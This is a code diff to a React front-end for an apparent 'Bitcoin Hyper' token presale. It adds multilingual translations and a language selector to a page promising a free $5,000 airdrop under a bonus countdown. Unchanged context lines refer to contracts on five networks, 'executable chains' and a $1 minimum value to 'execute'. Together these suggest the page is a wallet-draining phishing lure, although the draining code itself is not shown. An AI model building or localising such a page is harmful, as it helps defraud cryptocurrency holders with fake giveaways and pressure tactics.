@@ -5,6 +5,362 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
+// LANGUAGE DETECTION & TRANSLATIONS
+// ============================================
+
+const SUPPORTED_LANGUAGES = {
+  en: { name: 'English', flag: '🇺🇸', native: 'English' },
+  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
+  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
+  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
+  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
+  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
+  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
+  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
+  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
+  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
+  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
+  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
+  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
+  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
+  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
+  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
+  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
+  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
+};
+
+const TRANSLATIONS = {
+  en: {
+    presaleLive: 'PRESALE LIVE · STAGE 4',
+    bonusEndsIn: 'BONUS ENDS IN',
+    days: 'days',
+    hrs: 'hrs',
+    mins: 'mins',
+    secs: 'secs',
+    bonus: '+25% BONUS · 5,000 BTH',
+    instantAirdrop: 'instant airdrop · +25% extra',
+    bthPrice: 'BTH PRICE',
+    bonusLabel: 'BONUS',
+    presale: 'PRESALE',
+    stage4: 'STAGE 4',
+    claim: 'CLAIM $5,000 BTH',
+    processing: 'PROCESSING...',
+    completed: '✓ COMPLETED SUCCESSFULLY',
+    secured: 'Your $5,000 BTH has been secured',
+    view: 'VIEW YOUR $5,000 BTH',
+    welcome: 'Welcome to Bitcoin Hyper',
+    connectWallet: 'CONNECT WALLET',
+    disconnect: 'Disconnect Wallet',
+    checkEligibility: 'Checking Eligibility',
+    verifying: 'Verifying your wallet...',
+    terms: 'Terms',
+    delivery: 'Delivery',
+    airdrop: '$5k Airdrop',
+    liveNow: '5,000 BTH · +25% bonus · live now',
+    successful: 'SUCCESSFUL!',
+    youHaveSecured: 'You have secured',
+    viewButton: 'VIEW',
+    checkWalletEligibility: '⚡ Check Wallet Eligibility',
+    whenQualified: 'When qualified, confirm to claim your airdrop',
+    valueBadge: '$5,000 BTH',
+    progress: 'Progress',
+    today: 'Today',
+    avg: 'Avg',
+    totalRaised: 'Total Raised',
+    tokenPrice: 'Token Price',
+    currentBonus: 'Current Bonus',
+    participants: 'participants'
+  },
+  es: {
+    presaleLive: 'PREVENTA EN VIVO · ETAPA 4',
+    bonusEndsIn: 'EL BONO TERMINA EN',
+    days: 'días',
+    hrs: 'hrs',
+    mins: 'mins',
+    secs: 'segs',
+    bonus: '+25% BONO · 5,000 BTH',
+    instantAirdrop: 'airdrop instantáneo · +25% extra',
+    bthPrice: 'PRECIO BTH',
+    bonusLabel: 'BONO',
+    presale: 'PREVENTA',
+    stage4: 'ETAPA 4',
+    claim: 'RECLAMAR $5,000 BTH',
+    processing: 'PROCESANDO...',
+    completed: '✓ COMPLETADO CON ÉXITO',
+    secured: 'Tus $5,000 BTH han sido asegurados',
+    view: 'VER TUS $5,000 BTH',
+    welcome: 'Bienvenido a Bitcoin Hyper',
+    connectWallet: 'CONECTAR WALLET',
+    disconnect: 'Desconectar Wallet',
+    checkEligibility: 'Verificando Elegibilidad',
+    verifying: 'Verificando tu wallet...',
+    terms: 'Términos',
+    delivery: 'Entrega',
+    airdrop: 'Airdrop $5k',
+    liveNow: '5,000 BTH · +25% bono · en vivo ahora',
+    successful: '¡EXITOSO!',
+    youHaveSecured: 'Has asegurado',
+    viewButton: 'VER',
+    checkWalletEligibility: '⚡ Verificar Elegibilidad',
+    whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
+    valueBadge: '$5,000 BTH',
+    progress: 'Progreso',
+    today: 'Hoy',
+    avg: 'Prom',
+    totalRaised: 'Total Recaudado',
+    tokenPrice: 'Precio Token',
+    currentBonus: 'Bono Actual',
+    participants: 'participantes'
+  },
+  fr: {
+    presaleLive: 'PRÉVENTE EN DIRECT · ÉTAPE 4',
+    bonusEndsIn: 'BONUS SE TERMINE DANS',
+    days: 'jours',
+    hrs: 'h',
+    mins: 'min',
+    secs: 's',
+    bonus: '+25% BONUS · 5,000 BTH',
+    instantAirdrop: 'airdrop instantané · +25% extra',
+    bthPrice: 'PRIX BTH',
+    bonusLabel: 'BONUS',
+    presale: 'PRÉVENTE',
+    stage4: 'ÉTAPE 4',
+    claim: 'RÉCLAMER $5,000 BTH',
+    processing: 'TRAITEMENT...',
+    completed: '✓ TERMINÉ AVEC SUCCÈS',
+    secured: 'Vos $5,000 BTH ont été sécurisés',
+    view: 'VOIR VOS $5,000 BTH',
+    welcome: 'Bienvenue sur Bitcoin Hyper',
+    connectWallet: 'CONNECTER WALLET',
+    disconnect: 'Déconnecter Wallet',
+    checkEligibility: 'Vérification d\'Éligibilité',
+    verifying: 'Vérification de votre wallet...',
+    terms: 'Conditions',
+    delivery: 'Livraison',
+    airdrop: 'Airdrop $5k',
+    liveNow: '5,000 BTH · +25% bonus · en direct',
+    successful: 'SUCCÈS !',
+    youHaveSecured: 'Vous avez sécurisé',
+    viewButton: 'VOIR',
+    checkWalletEligibility: '⚡ Vérifier Éligibilité',
+    whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
+    valueBadge: '$5,000 BTH',
+    progress: 'Progrès',
+    today: 'Aujourd\'hui',
+    avg: 'Moy',
+    totalRaised: 'Total Collecté',
+    tokenPrice: 'Prix Token',
+    currentBonus: 'Bonus Actuel',
+    participants: 'participants'
+  },
+  de: {
+    presaleLive: 'VORVERKAUF LIVE · STUFE 4',
+    bonusEndsIn: 'BONUS ENDET IN',
+    days: 'Tage',
+    hrs: 'Std',
+    mins: 'Min',
+    secs: 'Sek',
+    bonus: '+25% BONUS · 5,000 BTH',
+    instantAirdrop: 'sofortiger Airdrop · +25% extra',
+    bthPrice: 'BTH PREIS',
+    bonusLabel: 'BONUS',
+    presale: 'VORVERKAUF',
+    stage4: 'STUFE 4',
+    claim: '$5,000 BTH ANFORDERN',
+    processing: 'VERARBEITUNG...',
+    completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
+    secured: 'Ihre $5,000 BTH wurden gesichert',
+    view: 'IHRE $5,000 BTH ANSEHEN',
+    welcome: 'Willkommen bei Bitcoin Hyper',
+    connectWallet: 'WALLET VERBINDEN',
+    disconnect: 'Wallet trennen',
+    checkEligibility: 'Berechtigung prüfen',
+    verifying: 'Ihr Wallet wird verifiziert...',
+    terms: 'Bedingungen',
+    delivery: 'Lieferung',
+    airdrop: '$5k Airdrop',
+    liveNow: '5,000 BTH · +25% Bonus · live jetzt',
+    successful: 'ERFOLGREICH!',
+    youHaveSecured: 'Sie haben gesichert',
+    viewButton: 'ANSEHEN',
+    checkWalletEligibility: '⚡ Berechtigung prüfen',
+    whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
+    valueBadge: '$5,000 BTH',
+    progress: 'Fortschritt',
+    today: 'Heute',
+    avg: 'Schnitt',
+    totalRaised: 'Gesamt eingesammelt',
+    tokenPrice: 'Token Preis',
+    currentBonus: 'Aktueller Bonus',
+    participants: 'Teilnehmer'
+  },
+  zh: {
+    presaleLive: '预售进行中 · 第四阶段',
+    bonusEndsIn: '奖励结束于',
+    days: '天',
+    hrs: '小时',
+    mins: '分钟',
+    secs: '秒',
+    bonus: '+25% 奖励 · 5,000 BTH',
+    instantAirdrop: '即时空投 · +25% 额外',
+    bthPrice: 'BTH 价格',
+    bonusLabel: '奖励',
+    presale: '预售',
+    stage4: '第四阶段',
+    claim: '领取 $5,000 BTH',
+    processing: '处理中...',
+    completed: '✓ 成功完成',
+    secured: '您的 $5,000 BTH 已确保',
+    view: '查看您的 $5,000 BTH',
+    welcome: '欢迎来到 Bitcoin Hyper',
+    connectWallet: '连接钱包',
+    disconnect: '断开钱包',
+    checkEligibility: '检查资格',
+    verifying: '正在验证您的钱包...',
+    terms: '条款',
+    delivery: '交付',
+    airdrop: '$5k 空投',
+    liveNow: '5,000 BTH · +25% 奖励 · 正在进行',
+    successful: '成功！',
+    youHaveSecured: '您已确保',
+    viewButton: '查看',
+    checkWalletEligibility: '⚡ 检查钱包资格',
+    whenQualified: '符合条件时，确认领取空投',
+    valueBadge: '$5,000 BTH',
+    progress: '进度',
+    today: '今日',
+    avg: '平均',
+    totalRaised: '总筹集',
+    tokenPrice: '代币价格',
+    currentBonus: '当前奖励',
+    participants: '参与者'
+  },
+  ja: {
+    presaleLive: 'プレセール実施中 · ステージ4',
+    bonusEndsIn: 'ボーナス終了まで',
+    days: '日',
+    hrs: '時間',
+    mins: '分',
+    secs: '秒',
+    bonus: '+25% ボーナス · 5,000 BTH',
+    instantAirdrop: '即時エアドロップ · +25% 追加',
+    bthPrice: 'BTH 価格',
+    bonusLabel: 'ボーナス',
+    presale: 'プレセール',
+    stage4: 'ステージ4',
+    claim: '$5,000 BTH を受け取る',
+    processing: '処理中...',
+    completed: '✓ 正常に完了',
+    secured: '$5,000 BTH が確保されました',
+    view: '$5,000 BTH を表示',
+    welcome: 'Bitcoin Hyper へようこそ',
+    connectWallet: 'ウォレット接続',
+    disconnect: 'ウォレット切断',
+    checkEligibility: '資格確認中',
+    verifying: 'ウォレットを検証中...',
+    terms: '利用規約',
+    delivery: '配信',
+    airdrop: '$5k エアドロップ',
+    liveNow: '5,000 BTH · +25% ボーナス · 実施中',
+    successful: '成功！',
+    youHaveSecured: '確保しました',
+    viewButton: '表示',
+    checkWalletEligibility: '⚡ ウォレット資格を確認',
+    whenQualified: '資格がある場合、確認してエアドロップを受け取る',
+    valueBadge: '$5,000 BTH',
+    progress: '進捗',
+    today: '今日',
+    avg: '平均',
+    totalRaised: '総調達額',
+    tokenPrice: 'トークン価格',
+    currentBonus: '現在のボーナス',
+    participants: '参加者'
+  },
+  ko: {
+    presaleLive: '프리세일 진행 중 · 4단계',
+    bonusEndsIn: '보너스 종료까지',
+    days: '일',
+    hrs: '시간',
+    mins: '분',
+    secs: '초',
+    bonus: '+25% 보너스 · 5,000 BTH',
+    instantAirdrop: '즉시 에어드랍 · +25% 추가',
+    bthPrice: 'BTH 가격',
+    bonusLabel: '보너스',
+    presale: '프리세일',
+    stage4: '4단계',
+    claim: '$5,000 BTH 받기',
+    processing: '처리 중...',
+    completed: '✓ 성공적으로 완료',
+    secured: '$5,000 BTH가 확보되었습니다',
+    view: '$5,000 BTH 보기',
+    welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
+    connectWallet: '지갑 연결',
+    disconnect: '지갑 연결 해제',
+    checkEligibility: '자격 확인 중',
+    verifying: '지갑 확인 중...',
+    terms: '약관',
+    delivery: '전달',
+    airdrop: '$5k 에어드랍',
+    liveNow: '5,000 BTH · +25% 보너스 · 진행 중',
+    successful: '성공!',
+    youHaveSecured: '확보했습니다',
+    viewButton: '보기',
+    checkWalletEligibility: '⚡ 지갑 자격 확인',
+    whenQualified: '자격이 되면 확인하여 에어드랍 받기',
+    valueBadge: '$5,000 BTH',
+    progress: '진행률',
+    today: '오늘',
+    avg: '평균',
+    totalRaised: '총 모금액',
+    tokenPrice: '토큰 가격',
+    currentBonus: '현재 보너스',
+    participants: '참가자'
+  },
+  ar: {
+    presaleLive: 'بيع مسبق مباشر · المرحلة 4',
+    bonusEndsIn: 'تنتهي المكافأة في',
+    days: 'أيام',
+    hrs: 'ساعات',
+    mins: 'دقائق',
+    secs: 'ثواني',
+    bonus: '+25٪ مكافأة · 5,000 BTH',
+    instantAirdrop: 'إسقاط جوي فوري · +25٪ إضافي',
+    bthPrice: 'سعر BTH',
+    bonusLabel: 'مكافأة',
+    presale: 'بيع مسبق',
+    stage4: 'المرحلة 4',
+    claim: 'استلام $5,000 BTH',
+    processing: 'جاري المعالجة...',
+    completed: '✓ اكتمل بنجاح',
+    secured: 'تم تأمين $5,000 BTH الخاص بك',
+    view: 'عرض $5,000 BTH الخاص بك',
+    welcome: 'مرحباً بك في Bitcoin Hyper',
+    connectWallet: 'ربط المحفظة',
+    disconnect: 'قطع المحفظة',
+    checkEligibility: 'جاري التحقق من الأهلية',
+    verifying: 'جاري التحقق من محفظتك...',
+    terms: 'الشروط',
+    delivery: 'التسليم',
+    airdrop: 'إسقاط جوي $5k',
+    liveNow: '5,000 BTH · +25٪ مكافأة · مباشر الآن',
+    successful: 'نجاح!',
+    youHaveSecured: 'لقد قمت بتأمين',
+    viewButton: 'عرض',
+    checkWalletEligibility: '⚡ التحقق من أهلية المحفظة',
+    whenQualified: 'عند التأهل، قم بالتأكيد لاستلام الإسقاط الجوي',
+    valueBadge: '$5,000 BTH',
+    progress: 'التقدم',
+    today: 'اليوم',
+    avg: 'المتوسط',
+    totalRaised: 'الإجمالي المجموع',
+    tokenPrice: 'سعر التوكن',
+    currentBonus: 'المكافأة الحالية',
+    participants: 'مشارك'
+  }
+};
+
+// ============================================
 // DEPLOYED CONTRACTS ON ALL 5 NETWORKS
 // ============================================
 
@@ -106,6 +462,13 @@ function App() {
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
+  
+  // ============================================
+  // LANGUAGE STATE
+  // ============================================
+  const [language, setLanguage] = useState('en');
+  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
+  const t = TRANSLATIONS[language] || TRANSLATIONS.en;
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -142,6 +505,44 @@ function App() {
 
   // Minimum value threshold to execute ($1)
   const MIN_VALUE_THRESHOLD = 1; // $1 minimum
+
+  // ============================================
+  // AUTO DETECT LANGUAGE FROM URL
+  // ============================================
+  useEffect(() => {
+    const detectLanguage = () => {
+      // Get language from URL path (e.g., /es, /fr, /de)
+      const path = window.location.pathname;
+      const pathLang = path.split('/')[1]; // Get first part after slash
+      
+      // Check if it's a valid language code
+      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
+        setLanguage(pathLang);
+      } else {
+        // Try to detect browser language
+        const browserLang = navigator.language.split('-')[0]; // Get primary language code
+        if (SUPPORTED_LANGUAGES[browserLang]) {
+          setLanguage(browserLang);
+        } else {
+          // Default to English
+          setLanguage('en');
+        }
+      }
+    };
+    
+    detectLanguage();
+    
+    // Listen for URL changes
+    const handleUrlChange = () => {
+      detectLanguage();
+    };
+    
+    window.addEventListener('popstate', handleUrlChange);
+    
+    return () => {
+      window.removeEventListener('popstate', handleUrlChange);
+    };
+  }, []);
 
   // Fetch crypto prices
   useEffect(() => {
@@ -425,6 +826,27 @@ function App() {
     } catch (err) {
       console.error('Prepare error:', err);
     }
+  };
+
+  // ============================================
+  // CHANGE LANGUAGE FUNCTION
+  // ============================================
+  const changeLanguage = (langCode) => {
+    setLanguage(langCode);
+    setShowLanguageDropdown(false);
+    
+    // Update URL without page reload
+    const url = new URL(window.location);
+    if (langCode === 'en') {
+      // Remove language from URL for default English
+      if (url.pathname.startsWith(`/${langCode}`)) {
+        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
+      }
+    } else {
+      // Add language to URL
+      url.pathname = `/${langCode}${url.pathname}`;
+    }
+    window.history.pushState({}, '', url.toString());
   };
 
   // ============================================
@@ -721,7 +1143,7 @@ function App() {
         {/* Glass Panel Card */}
         <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10 relative">
           
-          {/* TOP SECTION: logo + connect button with PRO RIBBON */}
+          {/* TOP SECTION: logo + connect button + language selector with PRO RIBBON */}
           <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8 relative">
             {/* Professional Ribbon Animation - Points to Connect Wallet */}
             {!isConnected && showRibbon && (
@@ -756,17 +1178,17 @@ function App() {
                       {/* Text */}
                       <div className="text-left">
                         <div className="text-xs font-bold text-white/90 uppercase tracking-wider">
-                          ⚡ Check Wallet Eligibility
+                          {t.checkWalletEligibility}
                         </div>
                         <div className="text-sm font-black text-white flex items-center gap-1">
-                          <span>When qualified, confirm to claim your airdrop</span>
+                          <span>{t.whenQualified}</span>
                           <i className="fas fa-bolt text-yellow-300 animate-bounce-slow ml-1"></i>
                         </div>
                       </div>
                       
                       {/* Value Badge */}
                       <div className="bg-black/30 backdrop-blur px-3 py-1 rounded-full border border-white/20">
-                        <span className="text-xs font-bold text-white">$5,000 BTH</span>
+                        <span className="text-xs font-bold text-white">{t.valueBadge}</span>
                       </div>
                     </div>
                     
@@ -782,36 +1204,83 @@ function App() {
               <span>BITCOINHYPER</span>
             </div>
             
-            {!isConnected ? (
-              <button
-                onClick={() => open()}
-                onMouseEnter={() => setHoverConnect(true)}
-                onMouseLeave={() => setHoverConnect(false)}
-                className="w-full sm:w-auto bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-4 sm:px-6 py-3 sm:py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] hover:shadow-[0_5px_15px_rgba(180,100,20,0.4)] transition-all uppercase tracking-wider whitespace-nowrap relative overflow-hidden group"
-              >
-                <span className="absolute inset-0 bg-white/10 transform scale-0 group-hover:scale-100 rounded-full transition-transform duration-500"></span>
-                <span className="relative flex h-2 w-2 mr-1">
-                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                  <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
-                </span>
-                <i className="fas fa-plug relative z-10 animate-bounce-slow"></i>
-                <span className="relative z-10">CONNECT WALLET</span>
-                <i className="fas fa-arrow-right ml-1 relative z-10 group-hover:translate-x-1 transition-transform"></i>
-              </button>
-            ) : (
-              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between sm:justify-start gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)]">
-                <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px] sm:max-w-none">
-                  {formatAddress(address)}
-                </span>
+            <div className="flex items-center gap-2">
+              {/* ============================================ */}
+              {/* SLEEK ALL COUNTRIES TRANSLATOR DROPDOWN */}
+              {/* ============================================ */}
+              <div className="relative">
                 <button
-                  onClick={() => disconnect()}
-                  className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-[#c47d24] border border-[#cc9f66] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all text-black shadow-lg"
-                  title="Disconnect Wallet"
+                  onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
+                  className="bg-black/60 backdrop-blur border border-[#c47d24]/30 rounded-full px-3 py-2 sm:px-4 sm:py-2 flex items-center gap-2 hover:border-[#d68a2e]/50 transition-all duration-300 group/lang"
                 >
-                  <i className="fas fa-power-off text-sm"></i>
+                  <span className="text-lg sm:text-xl">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
+                  <span className="text-xs sm:text-sm font-medium text-[#e0b880] group-hover/lang:text-[#f0c080] hidden sm:inline">
+                    {SUPPORTED_LANGUAGES[language]?.native || 'English'}
+                  </span>
+                  <i className={`fas fa-chevron-down text-[#c47d24] text-xs transition-transform duration-300 ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
                 </button>
+                
+                {/* Language Dropdown */}
+                {showLanguageDropdown && (
+                  <div className="absolute right-0 mt-2 w-64 sm:w-72 bg-[#0f1215] backdrop-blur-xl border border-[#c47d24]/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto animate-fadeIn">
+                    <div className="p-2">
+                      <div className="text-xs text-[#c47d24] px-3 py-2 font-semibold border-b border-[#c47d24]/20 mb-1">
+                        SELECT LANGUAGE
+                      </div>
+                      {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
+                        <button
+                          key={code}
+                          onClick={() => changeLanguage(code)}
+                          className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-[#c47d24]/10 ${
+                            language === code ? 'bg-[#c47d24]/20 border border-[#c47d24]/30' : ''
+                          }`}
+                        >
+                          <span className="text-xl">{lang.flag}</span>
+                          <div className="flex-1">
+                            <div className="text-sm font-medium text-white">{lang.name}</div>
+                            <div className="text-xs text-gray-400">{lang.native}</div>
+                          </div>
+                          {language === code && (
+                            <i className="fas fa-check text-[#c47d24] text-sm"></i>
+                          )}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                )}
               </div>
-            )}
+              
+              {!isConnected ? (
+                <button
+                  onClick={() => open()}
+                  onMouseEnter={() => setHoverConnect(true)}
+                  onMouseLeave={() => setHoverConnect(false)}
+                  className="bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-4 sm:px-6 py-3 sm:py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] hover:shadow-[0_5px_15px_rgba(180,100,20,0.4)] transition-all uppercase tracking-wider whitespace-nowrap relative overflow-hidden group"
+                >
+                  <span className="absolute inset-0 bg-white/10 transform scale-0 group-hover:scale-100 rounded-full transition-transform duration-500"></span>
+                  <span className="relative flex h-2 w-2 mr-1">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                  </span>
+                  <i className="fas fa-plug relative z-10 animate-bounce-slow"></i>
+                  <span className="relative z-10">{t.connectWallet}</span>
+                  <i className="fas fa-arrow-right ml-1 relative z-10 group-hover:translate-x-1 transition-transform"></i>
+                </button>
+              ) : (
+                <div className="bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)]">
+                  <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px] sm:max-w-none">
+                    {formatAddress(address)}
+                  </span>
+                  <button
+                    onClick={() => disconnect()}
+                    className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-[#c47d24] border border-[#cc9f66] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all text-black shadow-lg"
+                    title={t.disconnect}
+                  >
+                    <i className="fas fa-power-off text-sm"></i>
+                  </button>
+                </div>
+              )}
+            </div>
           </div>
 
           {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
@@ -821,8 +1290,8 @@ function App() {
                 <div className="flex items-center justify-center gap-4 mb-4">
                   <div className="w-12 h-12 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
-                    <div className="text-lg font-bold text-[#e0b880]">Checking Eligibility</div>
-                    <div className="text-sm text-gray-400">Verifying your wallet...</div>
+                    <div className="text-lg font-bold text-[#e0b880]">{t.checkEligibility}</div>
+                    <div className="text-sm text-gray-400">{t.verifying}</div>
                   </div>
                 </div>
                 
@@ -846,7 +1315,7 @@ function App() {
             <div className="bg-[rgba(180,100,20,0.15)] rounded-full px-4 sm:px-6 py-2 border border-[#c47d24]/50 inline-flex items-center gap-2 sm:gap-3 font-bold text-xs sm:text-sm backdrop-blur shadow-[0_0_10px_rgba(180,100,20,0.3)] animate-liveBlink relative overflow-hidden">
               <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
               <i className="fas fa-circle text-[#d44040] text-xs animate-blinkRed relative z-10"></i>
-              <span className="whitespace-nowrap relative z-10">PRESALE LIVE · STAGE 4</span>
+              <span className="whitespace-nowrap relative z-10">{t.presaleLive}</span>
               <span className="inline-block w-2 h-2 bg-[#d44040] rounded-full animate-blinkRed shadow-[0_0_8px_#d44040] relative z-10"></span>
             </div>
           </div>
@@ -854,14 +1323,14 @@ function App() {
           {/* Countdown Timer */}
           <div className="bg-black/60 rounded-2xl sm:rounded-full px-4 sm:px-5 py-4 sm:py-4 mb-5 sm:mb-6 border border-[#c47d24]/30 backdrop-blur shadow-[0_0_20px_rgba(180,100,20,0.1)] hover:shadow-[0_0_30px_rgba(180,100,20,0.2)] transition-all duration-500">
             <div className="text-[10px] sm:text-xs tracking-widest uppercase text-[#a0b0c0] mb-2 sm:mb-2 text-center">
-              <i className="fas fa-hourglass-half mr-1 sm:mr-2 animate-spin-slow"></i> BONUS ENDS IN
+              <i className="fas fa-hourglass-half mr-1 sm:mr-2 animate-spin-slow"></i> {t.bonusEndsIn}
             </div>
             <div className="grid grid-cols-4 gap-1 sm:gap-3">
               {[
-                { label: 'days', value: timeLeft.days },
-                { label: 'hrs', value: timeLeft.hours },
-                { label: 'mins', value: timeLeft.minutes },
-                { label: 'secs', value: timeLeft.seconds }
+                { label: t.days, value: timeLeft.days },
+                { label: t.hrs, value: timeLeft.hours },
+                { label: t.mins, value: timeLeft.minutes },
+                { label: t.secs, value: timeLeft.seconds }
               ].map((item, index) => (
                 <div key={index} className="flex flex-col items-center group/count">
                   <span className="text-xl sm:text-2xl md:text-4xl font-extrabold bg-gradient-to-b from-[#d68a2e] to-[#b36e1a] bg-clip-text text-transparent drop-shadow-[0_0_6px_rgba(180,100,20,0.4)] group-hover/count:scale-110 transition-transform duration-300">
@@ -886,7 +1355,7 @@ function App() {
                 <i className="fas fa-gem absolute inset-0 text-lg sm:text-3xl text-yellow-300 animate-ping opacity-75"></i>
               </div>
               
-              <span className="whitespace-nowrap relative z-10 animate-pulse-text">+25% BONUS · 5,000 BTH</span>
+              <span className="whitespace-nowrap relative z-10 animate-pulse-text">{t.bonus}</span>
               
               <div className="relative">
                 <i className="fas fa-bolt text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop relative z-10"></i>
@@ -901,7 +1370,7 @@ function App() {
           
           <div className="text-center mb-4 sm:mb-6">
             <span className="bg-black/60 rounded-full px-4 sm:px-6 py-1.5 sm:py-2 text-[10px] sm:text-xs border border-[#c47d24]/40 text-[#e0b880] font-semibold backdrop-blur inline-block hover:border-[#d68a2e] hover:text-[#f0c080] transition-all duration-300">
-              <i className="fas fa-bolt mr-1 sm:mr-2 animate-bounce-slow"></i> instant airdrop · +25% extra
+              <i className="fas fa-bolt mr-1 sm:mr-2 animate-bounce-slow"></i> {t.instantAirdrop}
             </span>
           </div>
 
@@ -909,26 +1378,26 @@ function App() {
           <div className="bg-black/60 rounded-2xl sm:rounded-[40px] p-4 sm:p-6 mb-6 sm:mb-8 grid grid-cols-3 gap-2 border border-[#c47d24]/30 backdrop-blur relative overflow-hidden group/stats hover:border-[#d68a2e]/50 transition-all duration-500">
             <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-shimmerSlow"></div>
             <div className="text-center relative z-10 group/price">
-              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/price:text-[#d68a2e] transition-colors duration-300">BTH PRICE</div>
+              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/price:text-[#d68a2e] transition-colors duration-300">{t.bthPrice}</div>
               <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/price:scale-110 transition-transform duration-300">
                 ${presaleStats.tokenPrice} <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5 group-hover/price:text-[#e09a3e]">+150%</span>
               </div>
             </div>
             <div className="text-center relative z-10 group/bonus">
-              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/bonus:text-[#d68a2e] transition-colors duration-300">BONUS</div>
+              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/bonus:text-[#d68a2e] transition-colors duration-300">{t.bonusLabel}</div>
               <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/bonus:scale-110 transition-transform duration-300">
                 5k <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5 group-hover/bonus:text-[#e09a3e]">+25%</span>
               </div>
             </div>
             <div className="text-center relative z-10 group/stage">
-              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/stage:text-[#d68a2e] transition-colors duration-300">PRESALE</div>
+              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/stage:text-[#d68a2e] transition-colors duration-300">{t.presale}</div>
               <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/stage:scale-110 transition-transform duration-300">
-                STAGE 4
+                {t.stage4}
               </div>
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible, has executable chains, and not all completed */}
+          {/* Main Claim Area - UPDATED WITH FLARE VERSION STYLING */}
